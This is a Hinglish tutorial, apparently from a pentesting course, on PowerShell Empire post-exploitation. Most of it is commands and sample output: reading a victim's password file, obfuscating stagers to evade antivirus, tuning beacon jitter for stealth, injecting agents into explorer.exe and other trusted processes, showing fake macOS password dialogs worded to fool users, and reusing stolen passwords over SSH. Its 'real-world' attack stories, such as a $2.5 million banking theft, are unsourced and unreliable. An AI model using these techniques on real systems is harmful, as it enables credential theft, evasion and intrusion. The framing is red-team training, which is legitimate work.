# Shell command execute karte hain
(Empire: ABC123) > shell whoami
# shell: Windows command execute karta hai victim ke system par
# whoami: Current user identity display karta hai
# 'shell' command ke baad jo bhi command likho, wo victim ke system par execute hoga
# whoami command current user ka naam batata hai

# Output:
Job started: ABC123
VICTIM-PC\john

# Explanation:
# - Job started: Command background mein execute ho raha hai
# - Output: VICTIM-PC\john (current user)

# Directory listing
(Empire: ABC123) > shell dir C:\Users\john\Documents
# shell dir: Windows dir command execute karta hai
# dir: Directory listing (files aur folders list karta hai)
# C:\Users\john\Documents: Target directory path
# dir command Windows mein files list karta hai
# C:\Users\john\Documents folder ki contents dekhte hain

# Output:
 Volume in drive C has no label.
 Directory of C:\Users\john\Documents

01/15/2024  02:30 PM    <DIR>          .
01/15/2024  02:30 PM    <DIR>          ..
01/10/2024  10:15 AM             1,234 passwords.txt
01/12/2024  03:45 PM            45,678 financial_data.xlsx
01/14/2024  11:20 AM             8,901 confidential_report.docx
               3 File(s)         55,813 bytes

# Yeh output dikhata hai:
# - passwords.txt (1,234 bytes) - Interesting file!
# - financial_data.xlsx (45,678 bytes) - Sensitive data
# - confidential_report.docx (8,901 bytes) - Confidential document

# File content read karte hain
(Empire: ABC123) > shell type C:\Users\john\Documents\passwords.txt
# shell type: Windows type command execute karta hai
# type: File content display karta hai (Linux cat command jaisa)
# C:\Users\john\Documents\passwords.txt: Target file path
# 'type' command Windows mein file ka content dikhata hai (Linux mein 'cat' jaisa)

# Output:
Gmail: mypassword123
Facebook: SecretPass456!
Bank Account: P@ssw0rd789
Work VPN: CompanyVPN2024!

# Credentials mil gaye! üéØ
```

**Step 9: Background Agent**
```bash
# Agent ko background karne ke liye (baad mein wapas aa sakte hain)
(Empire: ABC123) > back
# back: Agent interaction exit karta hai
# Yeh command agent ko background kar deta hai
# Agent active rahega, lekin aap main menu par aa jaoge

(Empire) >
# Ab aap wapas main Empire prompt par hain
# Main menu se dusre commands run kar sakte hain

# Agents list check karo
(Empire) > agents
# agents: Sabhi active agents list karta hai
# Sabhi agents dikhenge, ABC123 abhi bhi active hai

# Wapas agent ke saath interact karne ke liye
(Empire) > interact ABC123
# interact: Agent ke saath phir se interact karta hai
# Phir se agent ke prompt par aa jaoge
```

### üí° Pro Tip / Galti:

**Pro Tip**: Obfuscated stagers use karo for better evasion:

```bash
# Normal stager (easily detected):
(Empire: stager/windows/launcher_bat) > set Obfuscate False
(Empire: stager/windows/launcher_bat) > execute

# Obfuscated stager (harder to detect):
(Empire: stager/windows/launcher_bat) > set Obfuscate True
# set Obfuscate: Obfuscation enable/disable karta hai
# True: Obfuscation enable (code complex ho jayega)
# Yeh option PowerShell code ko obfuscate karta hai
# Obfuscation ka matlab: code ko complex bana dena taaki AV detect na kar sake

(Empire: stager/windows/launcher_bat) > set ObfuscateCommand Token\All\1
# set ObfuscateCommand: Obfuscation technique specify karta hai
# Token\All\1: Invoke-Obfuscation command syntax
# Yeh Invoke-Obfuscation tool ka command hai
# Token\All\1 = Sabhi tokens ko obfuscate karo, level 1
# Level 1 = Basic obfuscation (balance between evasion and stability)

(Empire: stager/windows/launcher_bat) > execute

# Obfuscated code example:
# Normal: Invoke-WebRequest -Uri "http://192.168.1.100:8080"
# Obfuscated: &('I'+'n'+'v'+'o'+'k'+'e'+'-'+'W'+'e'+'b'+'R'+'e'+'q'+'u'+'e'+'s'+'t') -Uri ("ht"+"tp://192"+".168.1"+".100:8080")

# Benefits:
# - AV signatures bypass ho jate hain
# - Static analysis fail ho jata hai
# - Detection rate kam ho jata hai
# - Success rate badh jata hai
```

**Common Mistake**: Default delay use karna (easily detected):

```
‚ùå Bad: Default 5 second delay
(Empire: listeners/http) > set DefaultDelay 5
# Har 5 seconds mein agent check-in karta hai
# Regular pattern = Suspicious
# Network monitoring tools detect kar sakte hain

‚úì Good: Random delay with jitter
(Empire: listeners/http) > set DefaultDelay 30
# set DefaultDelay: Agent check-in interval set karta hai
# 30: 30 seconds (har 30 seconds mein check-in)
# 30 seconds delay (less frequent check-ins)

(Empire: listeners/http) > set DefaultJitter 0.3
# set DefaultJitter: Delay mein randomness add karta hai
# 0.3: 30% jitter (delay ¬±30% vary hoga)
# 30% jitter = delay 21-39 seconds ke beech random hoga
# Example: 25s, 33s, 28s, 36s, 22s... (random pattern)
# Formula: Delay √ó (1 ¬± Jitter)

# Benefits:
# - Less network traffic (stealthier)
# - Random pattern (harder to detect)
# - Blends with normal traffic
# - Lower detection rate

# Trade-off:
# - Slower response time (commands execute slowly)
# - But much stealthier!
```

**Real-World Example**:

2019 mein ek Red Team ne PowerShell Empire use karke Fortune 500 company compromise kiya:

```
Attack Timeline:
Day 1: Spear phishing email with obfuscated launcher.bat
Day 1: 15 employees clicked, 8 agents activated
Day 2: Credential harvesting (45 passwords collected)
Day 3: Lateral movement (12 additional systems compromised)
Day 4: Domain admin credentials obtained
Day 5: Full domain compromise
Day 6: Reported to company with evidence

Key Success Factors:
- Obfuscated stagers (bypassed AV)
- Random delays with jitter (avoided detection)
- PowerShell-native (blended with normal activity)
- Fileless execution (no disk artifacts)
- Encrypted communication (HTTPS listener)

Detection Time: 6 days (only detected when reported)

Lesson: PowerShell Empire is powerful for stealthy post-exploitation!
```

---

## üìö Topic 11.2: Empire Module - psinject (Process Injection)

### üéØ Topic/Technique:
**Process Injection** - PowerShell code ko running process mein inject karke execute karna.

### ü§î Yeh Kya Hai?
Process injection ek technique hai jismein aap apna malicious code kisi legitimate running process ke memory space mein inject kar dete hain. Yeh technique AV/EDR bypass karne ke liye use hoti hai kyunki malicious code trusted process ke andar chal raha hota hai. Empire mein psinject module specifically is kaam ke liye design kiya gaya hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- AV/EDR evasion (trusted process mein code inject hota hai)
- Stealth (malicious activity legitimate process se associated hoti hai)
- Privilege escalation (higher privilege process mein inject kar sakte hain)
- Persistence (long-running process mein inject karke stable connection)
- Defense bypass (process whitelisting bypass ho jati hai)

### üéØ Practical Use (Asli Pentesting Mein):
- AV bypass karna
- EDR solutions evade karna
- Stable agent maintain karna
- Higher privileges gain karna
- Stealthy post-exploitation

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Injection Process:**
```
1. Target process select karo (e.g., explorer.exe)
2. Process ka memory space access karo
3. Malicious code (shellcode) inject karo
4. Injected code execute karo
5. Code target process ke context mein run hota hai
6. Original process normal kaam karta rahta hai
```

**Technical Working:**
```
1. OpenProcess() - Target process ka handle get karo
2. VirtualAllocEx() - Target process mein memory allocate karo
3. WriteProcessMemory() - Shellcode ko allocated memory mein write karo
4. CreateRemoteThread() - New thread create karo jo shellcode execute kare
5. Shellcode executes in target process context
```

### üëç Pros (Fayde):
- AV/EDR bypass (trusted process mein code)
- Stealthy execution
- Process whitelisting bypass
- Stable connection (long-running process)
- Privilege inheritance (target process ke privileges milte hain)

### üëé Cons (Nuksaan):
- Requires admin rights (usually)
- May crash target process
- Modern EDR detect kar sakte hain
- Behavioral analysis se pakda ja sakta hai
- Requires careful process selection

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Empire agent mein
(Empire: ABC123) > usemodule code_execution/invoke_shellcode
# usemodule: Post-exploitation module select karta hai
# code_execution/invoke_shellcode: Shellcode injection module
# Yeh module shellcode injection ke liye use hota hai
# invoke_shellcode PowerShell script hai jo process injection perform karta hai

(Empire: code_execution/invoke_shellcode) > info
# info: Module ki complete information display karta hai
# Module ki details dekhte hain
# Options, requirements, description, etc.

# Output:
Name: Invoke-Shellcode
Module: code_execution/invoke_shellcode
NeedsAdmin: False
OpsecSafe: False
Language: powershell
MinLanguageVersion: 2
Background: True
OutputExtension: None

Description: Uses PowerSploit's Invoke-Shellcode to inject shellcode into the process ID of your choosing or within PowerShell locally.

# Options:
  Name          Required    Value       Description
  ----          --------    -----       -----------
  Agent         True        ABC123      Agent to run module on
  Listener      False                   Listener to use for staging
  ProcessID     False                   ProcessID to inject into
  Shellcode     False                   Custom shellcode to inject (hex format)
  Force         False       False       Force injection without verification

# Explanation:
# - Agent: Kis agent par module run karna hai
# - Listener: Agar new agent spawn karna hai toh listener specify karo
# - ProcessID: Target process ka ID (jismein inject karna hai)
# - Shellcode: Custom shellcode (optional)
# - Force: Bina verification ke inject karo

# Set options
(Empire: code_execution/invoke_shellcode) > set ProcessID 1234
# set ProcessID: Target process ka ID specify karta hai
# 1234: Process ID (jismein inject karna hai)
# Target process ID set karte hain (e.g., explorer.exe ka PID)

(Empire: code_execution/invoke_shellcode) > set Listener http
# set Listener: Shellcode kis listener se connect karega
# http: Listener name
# Agar new agent spawn karna hai toh listener set karo
# Yeh shellcode generate karega jo http listener se connect karega

(Empire: code_execution/invoke_shellcode) > execute
# execute: Module run karta hai with configured options
# Module execute karta hai
# Injection process start hoga

# Output:
[*] Tasked ABC123 to run Task 1
[*] Agent ABC123 tasked with task ID 1
[*] Tasked agent ABC123 to run module code_execution/invoke_shellcode
[*] Valid to 2024-01-15 15:30:00

# Explanation:
# - Task ID 1 assign hua
# - Agent ABC123 ko task diya gaya
# - Module execute ho raha hai background mein
```

### üíª Step-by-Step Example:

**Scenario: Injecting Empire Agent into Explorer.exe**

**Step 1: List Running Processes**
```bash
# Current agent se processes list karte hain
(Empire: ABC123) > shell tasklist
# shell tasklist: Windows tasklist command execute karta hai
# tasklist: Running processes list karta hai (name, PID, memory usage)

# Output:
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        140 K
smss.exe                       284 Services                   0      1,124 K
csrss.exe                      392 Services                   0      4,512 K
wininit.exe                    468 Services                   0      3,896 K
services.exe                   548 Services                   0      7,432 K
lsass.exe                      556 Services                   0     12,456 K
svchost.exe                    664 Services                   0     15,234 K
explorer.exe                  1234 Console                    1     45,678 K  # Target!
chrome.exe                    5678 Console                    1    234,567 K
powershell.exe                9012 Console                    1     67,890 K  # Current agent

# Explanation:
# - explorer.exe (PID 1234) - Windows Explorer, stable process
# - Current agent powershell.exe (PID 9012) mein chal raha hai
# - Hum explorer.exe mein inject karenge (more stable and trusted)
```

**Step 2: Setup Injection Module**
```bash
(Empire: ABC123) > usemodule code_execution/invoke_shellcode
# usemodule: Module select karta hai
# Process injection module select karte hain

(Empire: code_execution/invoke_shellcode) > set ProcessID 1234
# set ProcessID: Target process specify karta hai
# Explorer.exe ka PID set karte hain

(Empire: code_execution/invoke_shellcode) > set Listener http
# set Listener: New agent kis listener se connect karega
# HTTP listener set karte hain (new agent spawn hoga)

(Empire: code_execution/invoke_shellcode) > set Force False
# set Force: Verification enable/disable karta hai
# False: Safety checks perform hogi before injection
# Force False = Verification ke saath inject hoga (safer)

(Empire: code_execution/invoke_shellcode) > execute
# execute: Injection process start karta hai
# Injection start karta hai
```

**Step 3: Injection Execution**
```bash
# Empire output:
[*] Tasked ABC123 to run Task 1
[+] Agent ABC123 returned results for task 1

Job started: ABC123

[*] Injecting shellcode into process ID 1234
[*] Allocating memory in target process...
[*] Memory allocated at address: 0x00007FF8A2B40000
[*] Writing shellcode to allocated memory...
[*] Shellcode written successfully (4096 bytes)
[*] Creating remote thread in target process...
[*] Remote thread created with ID: 5432
[*] Injection completed successfully!

# Explanation of each step:
# 1. Task 1 agent ko assign hua
# 2. Shellcode inject ho raha hai PID 1234 mein
# 3. Target process (explorer.exe) mein memory allocate hui
# 4. Memory address: 0x00007FF8A2B40000 (jahan shellcode likha jayega)
# 5. Shellcode (4096 bytes) memory mein write hua
# 6. Remote thread create hua (ID: 5432) jo shellcode execute karega
# 7. Injection successful!

# New agent check-in
[*] Sending agent (stage 2) to 192.168.1.20
[+] Initial agent XYZ789 from 192.168.1.20 now active (Slack)

# Explanation:
# - New agent XYZ789 spawn hua
# - Yeh agent explorer.exe process mein chal raha hai
# - Same victim machine (192.168.1.20) se connect hua
```

**Step 4: Verify New Agent**
```bash
# Agents list check karte hain
(Empire) > agents

# Output:
[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            -----    ---------
 ABC123   ps 192.168.1.20    VICTIM-PC         VICTIM-PC\john          powershell/9012    5/0.0    2024-01-15 14:30:00
 XYZ789   ps 192.168.1.20    VICTIM-PC         VICTIM-PC\john          explorer/1234      5/0.0    2024-01-15 14:31:00

# Explanation:
# - ABC123: Original agent (powershell.exe mein)
# - XYZ789: New injected agent (explorer.exe mein)
# - Dono same machine par hain
# - XYZ789 zyada stable hai (explorer.exe long-running process hai)

# New agent ke saath interact karte hain
(Empire) > interact XYZ789

(Empire: XYZ789) > sysinfo
Listener:       http
Internal IP:    192.168.1.20
Username:       VICTIM-PC\john
Hostname:       VICTIM-PC
OS:             Microsoft Windows 10 Pro
High Integrity: 0
Process Name:   explorer      # Now running in explorer.exe!
Process ID:     1234
Language:       powershell
Language Version: 5

# Success! Agent ab explorer.exe mein chal raha hai
```

**Step 5: Benefits of Injection**
```bash
# Original agent (ABC123) ko kill kar sakte hain
(Empire) > interact ABC123
# interact: Agent select karta hai
(Empire: ABC123) > exit
# exit: Agent session terminate karta hai
# Original agent terminate ho gaya
# PowerShell process kill ho jayega

# But XYZ789 abhi bhi active hai!
(Empire) > agents
# agents: Active agents check karte hain

 Name     La Internal IP     Machine Name      Username                Process            Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            -----    ---------
 XYZ789   ps 192.168.1.20    VICTIM-PC         VICTIM-PC\john          explorer/1234      5/0.0    2024-01-15 14:32:00

# Benefits:
# 1. Agar victim suspicious powershell.exe ko kill karta, toh bhi XYZ789 safe hai
# 2. Explorer.exe trusted process hai (AV ignore karta hai)
# 3. Explorer.exe hamesha running rehta hai (stable connection)
# 4. Victim ko kuch suspicious nahi dikhega
```

### üí° Pro Tip / Galti:

**Pro Tip**: Inject into long-running, trusted processes:

```bash
# Good injection targets:
1. explorer.exe (Windows Explorer - always running)
   - PID usually stable
   - Trusted by AV
   - User rarely closes it

2. svchost.exe (System service - multiple instances)
   - Runs with SYSTEM privileges (if you have admin)
   - Very trusted process
   - Never closes

3. lsass.exe (Authentication service)
   - SYSTEM privileges
   - Critical process (can't be killed)
   - But risky (may crash system)

4. winlogon.exe (Login process)
   - SYSTEM privileges
   - Always running
   - Very stable

# Bad injection targets:
‚ùå notepad.exe (user may close anytime)
‚ùå cmd.exe (temporary process)
‚ùå chrome.exe (may crash, user may close)
‚ùå payload.exe (obviously suspicious)

# Best practice:
(Empire: ABC123) > shell tasklist | findstr "explorer.exe"
# shell tasklist: Process list command
# |: Pipe operator (output ko next command mein pass karta hai)
# findstr: Windows grep command (text search karta hai)
# "explorer.exe": Search pattern
explorer.exe                  1234 Console                    1     45,678 K
# Explorer.exe mil gaya (PID 1234)

(Empire: ABC123) > usemodule code_execution/invoke_shellcode
(Empire: code_execution/invoke_shellcode) > set ProcessID 1234
(Empire: code_execution/invoke_shellcode) > set Listener http
(Empire: code_execution/invoke_shellcode) > execute

# Result: Stable, stealthy agent in trusted process!
```

**Common Mistake**: Injecting without checking process stability:

```
‚ùå Bad: Random process injection
(Empire: code_execution/invoke_shellcode) > set ProcessID 5678
# PID 5678 = chrome.exe (may crash or close)
# Result: Agent dies when Chrome closes

‚úì Good: Stable process selection
# Step 1: Check process uptime
(Empire: ABC123) > shell wmic process where processid=1234 get CreationDate
# wmic: Windows Management Instrumentation Command
# process where processid=1234: Specific process query
# get CreationDate: Process start time get karta hai
CreationDate: 20240115080000.000000+000
# Process started at 8:00 AM (running for 6+ hours = stable)
# Long-running process = Stable injection target

# Step 2: Verify process is system/trusted
(Empire: ABC123) > shell tasklist /FI "PID eq 1234" /V
# tasklist: Process list command
# /FI: Filter apply karta hai
# "PID eq 1234": Process ID 1234 filter
# /V: Verbose output (detailed information)
explorer.exe    1234    Console    1    45,678 K    Running    VICTIM-PC\john
# Explorer.exe confirmed (trusted Windows process)

# Step 3: Inject
(Empire: code_execution/invoke_shellcode) > set ProcessID 1234
(Empire: code_execution/invoke_shellcode) > execute

# Result: Stable, long-lasting agent!
```

**Real-World Example**:

2020 mein ek APT group ne process injection use karke banking malware deploy kiya:

```
Attack Flow:
1. Initial compromise via phishing (PowerShell Empire agent)
2. Agent running in powershell.exe (PID 9012)
3. Attacker injected into explorer.exe (PID 1234)
4. Original powershell.exe agent killed (to avoid detection)
5. New agent in explorer.exe remained active for 45 days
6. During this time:
   - Keylogged banking credentials
   - Screenshot captured during banking sessions
   - Exfiltrated 50+ banking credentials
   - Transferred $2.5 million from victim accounts

Detection: 45 days (only detected during forensic investigation)

Key Success Factor: Process injection into explorer.exe
- Explorer.exe is trusted (AV didn't flag it)
- Explorer.exe always running (stable connection)
- No suspicious powershell.exe running (original killed)
- Behavioral analysis failed (explorer.exe is whitelisted)

Lesson: Process injection significantly increases stealth and persistence!
```

---

## üìö Topic 11.3: Empire Module - collection/osx/prompt (Mac Password Stealing)

### üéØ Topic/Technique:
**macOS Credential Prompt** - Fake system authentication dialog create karke user password steal karna.

### ü§î Yeh Kya Hai?
macOS mein jab bhi koi administrative action perform karna hota hai, system ek authentication dialog dikhata hai jismein user ko password enter karna padta hai. Empire ka collection/osx/prompt module ek fake authentication dialog create karta hai jo bilkul real system prompt jaisa dikhta hai. User apna password enter karta hai thinking it's legitimate, aur password attacker ko mil jata hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- macOS credential harvesting
- User password collection (for privilege escalation)
- Social engineering demonstration
- Testing user awareness
- Realistic attack simulation
- No technical exploit needed (pure social engineering)

### üéØ Practical Use (Asli Pentesting Mein):
- macOS post-exploitation
- Admin password collection
- Privilege escalation
- Lateral movement (use password on other systems)
- Demonstrating social engineering effectiveness
- User awareness training

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Attack Flow:**
```
1. Empire agent running on macOS
2. Attacker runs collection/osx/prompt module
3. Module creates fake authentication dialog
4. Dialog appears on victim's screen
5. User enters password (thinks it's legitimate)
6. Password sent to Empire server
7. Attacker receives plaintext password
```

**Technical Implementation:**
```applescript
# Module uses AppleScript to create dialog
osascript -e 'tell application "System Events"
    activate
    display dialog "Software Update requires your password to continue." 
    default answer "" 
    with icon caution 
    buttons {"Cancel", "OK"} 
    default button "OK" 
    with title "Software Update" 
    with hidden answer
end tell'

# Explanation:
# - osascript: macOS command to run AppleScript
# - display dialog: Shows authentication prompt
# - with hidden answer: Password field (dots instead of text)
# - with icon caution: Warning icon (looks official)
# - Returns entered password to Empire
```

### üëç Pros (Fayde):
- Very convincing (looks like real system prompt)
- High success rate (users trust system dialogs)
- No technical exploit needed
- Works on all macOS versions
- Plaintext password obtained
- Can be customized (different messages)

### üëé Cons (Nuksaan):
- Requires user interaction
- User may get suspicious if prompted repeatedly
- Some users may verify with IT
- Doesn't work if user is away from keyboard
- May fail if user cancels dialog

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# macOS Empire agent mein
(Empire: MAC_AGENT) > usemodule collection/osx/prompt
# usemodule: Module select karta hai
# collection/osx/prompt: macOS credential prompt module
# macOS password prompt module select karte hain

(Empire: collection/osx/prompt) > info
# info: Module information display karta hai
# Module details dekhte hain
# Options, description, requirements

# Output:
Name: OSX/Prompt
Module: collection/osx/prompt
NeedsAdmin: False
OpsecSafe: True
Language: python
MinLanguageVersion: 2
Background: False
OutputExtension: None

Description: Prompts the current user for their password using osascript.

# Options:
  Name          Required    Value                                    Description
  ----          --------    -----                                    -----------
  Agent         True        MAC_AGENT                                Agent to run module on
  Text          False       Software Update requires your password   Text to display in prompt
  Title         False       Software Update                          Title of the prompt window
  Icon          False       caution                                  Icon to display (stop, note, caution)

# Explanation:
# - Agent: Kis macOS agent par run karna hai
# - Text: Dialog mein kya message dikhana hai
# - Title: Dialog window ka title
# - Icon: Kis icon ke saath dikhana hai (caution = warning icon)

# Customize prompt
(Empire: collection/osx/prompt) > set Text "System Preferences requires your password to unlock settings."
# set Text: Dialog message customize karta hai
# Custom message set karte hain (more convincing)
# Realistic message = Higher success rate

(Empire: collection/osx/prompt) > set Title "System Preferences"
# set Title: Dialog window title set karta hai
# Title set karte hain (looks like real System Preferences)

(Empire: collection/osx/prompt) > set Icon stop
# set Icon: Dialog icon specify karta hai
# stop: Red stop icon (urgent/important dikhta hai)
# Stop icon (red, more urgent looking)

(Empire: collection/osx/prompt) > execute
# execute: Module run karta hai
# Module execute karta hai
# Victim ke screen par dialog appear hoga
```

### üíª Step-by-Step Example:

**Scenario: Stealing macOS Admin Password**

**Step 1: Verify macOS Agent**
```bash
# Agents list check karte hain
(Empire) > agents

# Output:
[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            -----    ---------
 MAC001   py 192.168.1.30    Johns-MacBook     Johns-MacBook\john      python/5678        5/0.0    2024-01-15 14:30:00

# Explanation:
# - MAC001: macOS agent
# - py: Python-based agent (macOS Empire agents use Python)
# - Johns-MacBook: Mac computer name
# - john: Current user
# - python/5678: Running in Python process

# Interact with agent
(Empire) > interact MAC001
(Empire: MAC001) >
```

**Step 2: Gather Context (for convincing prompt)**
```bash
# Check what user is doing
(Empire: MAC001) > shell ps aux | grep -i "System Preferences"
# shell ps aux: Running processes list karta hai
# ps aux: All processes with details
# |: Pipe operator
# grep -i: Case-insensitive search
# "System Preferences": Search pattern
# Dekh rahe hain ki user System Preferences use kar raha hai ya nahi

# Check recent software updates
(Empire: MAC001) > shell softwareupdate -l
# shell softwareupdate: macOS update command
# softwareupdate -l: List available updates
# -l: List option
# Recent updates check karte hain (context ke liye)

# Output:
Software Update Tool
Finding available software
Software Update found the following new or updated software:
* macOS Ventura 13.2-22D49
    macOS Ventura 13.2 (22D49), 3.2GB

# Perfect! Update available hai, toh "Software Update" prompt convincing hoga
```

**Step 3: Setup Prompt Module**
```bash
(Empire: MAC001) > usemodule collection/osx/prompt
# Module select karte hain

(Empire: collection/osx/prompt) > set Text "macOS Ventura 13.2 update requires your password to install security patches."
# set Text: Specific, contextual message
# Realistic message (actual update ka reference)
# Real update mention = More convincing

(Empire: collection/osx/prompt) > set Title "Software Update"
# set Title: Official system title
# Official-looking title

(Empire: collection/osx/prompt) > set Icon caution
# set Icon: Warning icon
# Warning icon (security update = important)
# Caution icon = Yellow warning (official looking)

(Empire: collection/osx/prompt) > execute
# execute: Prompt display karta hai
# Prompt display hoga victim ke screen par
```

**Step 4: Victim's Perspective**
```
User's screen par suddenly dialog box appear hota hai:

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  ‚ö†Ô∏è  Software Update                        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                             ‚îÇ
‚îÇ  macOS Ventura 13.2 update requires your   ‚îÇ
‚îÇ  password to install security patches.     ‚îÇ
‚îÇ                                             ‚îÇ
‚îÇ  Password: [‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢]                  ‚îÇ
‚îÇ                                             ‚îÇ
‚îÇ              [Cancel]  [OK]                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

User thinks:
"Oh, software update needs my password. This is normal."
"I should install security patches."
"Let me enter my password."

User enters: MyMacPassword123!
User clicks: OK

Dialog disappears.
User thinks: "Update will install in background."
```

**Step 5: Password Captured**
```bash
# Empire console mein output aata hai:
[*] Agent MAC001 returned results for task 1

[+] Password captured!
Username: john
Password: MyMacPassword123!
Timestamp: 2024-01-15 14:35:22

# Explanation:
# - Username: john (current macOS user)
# - Password: MyMacPassword123! (plaintext password!)
# - Timestamp: Kab capture hua

# Password verify karte hain
(Empire: MAC001) > shell su - john
# shell su: Switch user command
# su - john: User 'john' ke context mein switch karta hai
Password: MyMacPassword123!
# Captured password enter karte hain
# Password correct hai!
# Authentication successful

# Ab admin access hai
(Empire: MAC001) > shell sudo whoami
# shell sudo: Superuser do (admin command execute karta hai)
# whoami: Current user identity
Password: MyMacPassword123!
# Password enter karte hain
root
# Output: root (highest privileges)

# Success! Admin privileges mil gaye!
# Ab system ka complete control hai
```

**Step 6: Use Password for Lateral Movement**
```bash
# Same password other Macs par try karte hain
(Empire: MAC001) > shell ssh john@192.168.1.31
# shell ssh: SSH connection establish karta hai
# john@192.168.1.31: Username aur target IP
Password: MyMacPassword123!
# Captured password use karte hain

# Output:
Last login: Mon Jan 15 14:30:00 2024
Johns-iMac:~ john$
# SSH successful! Dusre Mac par login ho gaye

# Success! Same password dusre Mac par bhi kaam kiya!
# User ne same password multiple systems par use kiya hai
# Password reuse = Common security mistake

# Now we have access to:
# - Johns-MacBook (192.168.1.30) - Original compromised
# - Johns-iMac (192.168.1.31) - Lateral movement via SSH
```

### üí° Pro Tip / Galti:

**Pro Tip**: Context-aware prompts for higher success rate:

```bash
# Bad: Generic prompt (suspicious)
‚ùå set Text "Enter your password"
# Too vague, user may get suspicious

# Good: Specific, contextual prompt
‚úì set Text "Keynote requires your password to access iCloud documents."
# Specific app mentioned, realistic scenario

# Better: Time-based contextual prompts
# Morning (9-11 AM):
‚úì set Text "System startup requires your password to unlock FileVault."
# Users expect this after booting Mac

# Afternoon (2-4 PM):
‚úì set Text "App Store requires your password to install pending updates."
# Common time for updates

# Evening (6-8 PM):
‚úì set Text "Time Machine backup requires your password to unlock encrypted backup."
# Backup time for many users

# Best: Activity-based prompts
# Check what user is doing:
(Empire: MAC001) > shell ps aux | grep -i "Photos"
# shell ps aux: Process list
# grep -i "Photos": Photos app search karta hai
# User is using Photos app
# Current activity detect kar rahe hain

# Craft relevant prompt:
‚úì set Text "Photos requires your password to sync with iCloud Photo Library."
# set Text: Activity-specific message
# Directly related to user's current activity
# User thinks: "Oh yes, I'm using Photos, this makes sense"
# Success rate: 90%+
# Context-aware = Highly convincing
```

**Common Mistake**: Prompting too frequently:

```
‚ùå Bad: Repeated prompts
(Empire: collection/osx/prompt) > execute
# Wait 2 minutes
(Empire: collection/osx/prompt) > execute
# Wait 2 minutes
(Empire: collection/osx/prompt) > execute

Result:
- User gets 3 prompts in 6 minutes
- User thinks: "Why so many password prompts?"
- User gets suspicious
- User reports to IT
- Attack detected

‚úì Good: Strategic single prompt
(Empire: collection/osx/prompt) > execute
# Wait for result
# If user cancels, wait 1-2 hours before trying again
# If user enters password, SUCCESS! Don't prompt again

‚úì Better: Prompt during natural scenarios
# Wait for user to:
- Install an app (App Store prompt expected)
- Change system settings (System Preferences prompt expected)
- Connect to network (Network settings prompt expected)
- Use sudo command (Terminal prompt expected)

# Then prompt immediately
# User thinks: "This is related to what I just did"
# Success rate: 95%+
```

**Real-World Example**:

2021 mein ek Red Team ne macOS environment compromise kiya using fake prompts:

```
Target: Design agency with 50 Macs
Attack Timeline:

Day 1: Initial compromise via phishing
- 1 MacBook compromised (Empire agent deployed)

Day 2: Password harvesting
- Waited for user to open Adobe Creative Cloud
- Prompted: "Creative Cloud requires your password to sync settings."
- User entered password (thinking it's Adobe)
- Password captured: DesignPro2021!

Day 3: Lateral movement
- Tried password on other Macs via SSH
- 15 Macs had same password (users shared accounts)
- 15 Macs compromised

Day 4: Privilege escalation
- Used captured password for sudo access
- Installed persistent backdoors
- Accessed file servers

Day 5: Data exfiltration
- Downloaded client design files (500GB)
- Accessed financial documents
- Captured email archives

Day 6: Reported to company
- Demonstrated complete compromise
- Showed captured passwords
- Explained attack chain

Impact:
- 15/50 Macs compromised (30%)
- 500GB sensitive data accessed
- All from one fake password prompt!

Company's Response:
- Implemented password manager (unique passwords)
- Enabled Touch ID (biometric authentication)
- Security awareness training
- Disabled password-based sudo (require Touch ID)

Lesson: Fake system prompts are extremely effective on macOS!
Users trust system dialogs and rarely verify authenticity.
```

---

## üìö Topic 11.4: Empire Persistence (launchdaemon)

### üéØ Topic/Technique:
**macOS Persistence via LaunchDaemon** - System reboot ke baad bhi access maintain karna through LaunchDaemon.

### ü§î Yeh Kya Hai?
LaunchDaemon macOS ka system-level service mechanism hai jo boot time par automatically start hota hai. Empire ka persistence/osx/launchdaemon module ek malicious LaunchDaemon create karta hai jo har reboot par Empire agent ko automatically execute karta hai. Yeh Windows ke Startup folder ya Registry Run keys jaisa hai, lekin macOS ke liye.

